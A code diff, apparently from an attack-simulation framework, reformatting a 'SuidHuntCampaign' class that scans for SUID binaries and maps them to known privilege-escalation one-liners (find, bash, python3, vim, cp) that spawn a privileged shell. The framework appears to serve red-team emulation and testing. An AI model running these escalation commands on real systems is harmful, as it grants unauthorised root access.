@@ -18,8 +18,8 @@ class SuidHuntCampaign(BaseCampaign):
     KNOWN_SUID_EXPLOITS = {
         "find": "find / -name '*.txt' -exec /bin/sh -p \\; -quit",
         "bash": "/bin/bash -p",
-        "python3": "python3 -c 'import os; os.execv(\"/bin/sh\", [\"sh\", \"-p\"])'",
-        "vim": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+        "python3": 'python3 -c \'import os; os.execv("/bin/sh", ["sh", "-p"])\'',
+        "vim": 'vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
         "cp": "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p",
     }
 
@@ -28,7 +28,9 @@ class SuidHuntCampaign(BaseCampaign):
         suid_bins = self._find_suid_binaries()
         self.log_step("suid_scan", f"Found {len(suid_bins)} SUID binaries")
         self.simulate_delay(1)
-        matches = {b: self.KNOWN_SUID_EXPLOITS[b] for b in suid_bins if b in self.KNOWN_SUID_EXPLOITS}
+        matches = {
+            b: self.KNOWN_SUID_EXPLOITS[b] for b in suid_bins if b in self.KNOWN_SUID_EXPLOITS
+        }
         self.log_step("exploit_match", f"Exploitable: {list(matches.keys())}")
         results = {
             "technique": self.TECHNIQUE_ID,
@@ -43,7 +45,9 @@ class SuidHuntCampaign(BaseCampaign):
         try:
             result = subprocess.run(
                 ["find", "/", "-perm", "-4000", "-type", "f"],
-                capture_output=True, text=True, timeout=15
+                capture_output=True,
+                text=True,
+                timeout=15,
             )
             bins = [line.split("/")[-1] for line in result.stdout.splitlines() if line]
             return bins if bins else ["find (simulated)", "python3 (simulated)"]
